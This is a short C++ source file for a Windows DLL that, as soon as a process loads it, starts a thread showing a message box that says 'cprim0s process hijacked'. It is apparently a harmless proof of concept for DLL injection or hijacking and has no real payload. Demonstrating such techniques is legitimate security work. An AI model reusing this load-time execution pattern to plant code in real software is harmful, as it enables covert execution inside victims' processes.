#include "pch.h"

static DWORD WINAPI ShowHi(LPVOID param)
{
    MessageBoxA(NULL, "cprim0s process hijacked", "Error", MB_OK | MB_ICONERROR);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE h = CreateThread(NULL, 0, ShowHi, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    return TRUE;
}